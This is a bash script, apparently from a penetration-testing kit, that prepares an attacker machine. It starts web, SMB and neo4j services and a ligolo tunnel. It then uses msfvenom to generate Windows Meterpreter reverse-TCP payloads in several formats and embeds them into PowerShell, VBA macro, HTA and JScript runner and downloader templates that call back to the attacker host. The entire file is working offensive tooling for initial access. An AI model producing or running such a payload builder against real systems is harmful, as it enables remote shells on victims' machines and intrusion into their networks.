#!/bin/bash

LHOST=$1

SHELLCODE_DIR=shellcodes
PAYLOAD_DIR=payloads
RESULT_DIR=results

if [ "$LHOST" -eq "" ]; then
    echo "$0 <LHOST>"
    exit
fi
# setup 
echo "[i] starting apache2"
systemctl start apache2
echo "[i] starting smbd"
systemctl start smbd
echo "[i] starting neo4j"
neo4j start

# ligolo
echo "[i] setting up ligolo"
ip tuntap add user root mode tun ligolo
ip link set ligolo up

# windows meterpreter paylaods
mkdir $SHELLCODE_DIR
echo "[i] generating windows meterpreter payload: ps1"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -f ps1 -o $SHELLCODE_DIR/met.ps1
echo "[i] generating windows meterpreter payload: vba64"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -f vbapplication -o $SHELLCODE_DIR/met.vba64
echo "[i] generating windows meterpreter payload: vba86"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -f vbapplication -o $SHELLCODE_DIR/met.vba86
echo "[i] generating windows meterpreter payload: hex"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -f hex -o $SHELLCODE_DIR/met.hex
echo "[i] generating windows meterpreter payload: exe"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -f exe -o $SHELLCODE_DIR/met.exe
echo "[i] generating windows meterpreter payload: dll"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -f dll -o $SHELLCODE_DIR/met.dll

# generate scripts
mkdir $RESULT_DIR
echo "[i] generating runner.ps1"
cat $PAYLOAD_DIR/runner.ps1 | sed -e "s/<SHELLCODE64>/$(cat $SHELLCODE_DIR/met.ps1)/g" > $RESULT_DIR/runner.ps1
echo "[i] generating runner.vba"
awk -v r="$(cat $SHELLCODE_DIR/met.vba64)" '{gsub(/<SHELLCODE64>/,r)}1' $PAYLOAD_DIR/runner.vba | awk -v r="$(cat $SHELLCODE_DIR/met.vba86)" '{gsub(/<SHELLCODE86>/,r)}1' - > $RESULT_DIR/runner.vba
echo "[i] generating downloader.hta"
cat $PAYLOAD_DIR/downloader.hta | sed -e "s/<LHOST>/$LHOST/g" -e "s/<SHELLCODE64>/$(cat $SHELLCODE_DIR/met.hex)/g" > $RESULT_DIR/downloader.hta
echo "[i] generating downloader.js"
cat $PAYLOAD_DIR/downloader.js | sed -e "s/<LHOST>/$LHOST/g" -e "s/<SHELLCODE64>/$(cat $SHELLCODE_DIR/met.hex)/g" > $RESULT_DIR/downloader.js

chmod 755 -R $SHELLCODE_DIR
chmod 755 -R $RESULT_DIR
chown kali:kali -R $SHELLCODE_DIR
chown kali:kali -R $RESULT_DIR

echo "[+] done"
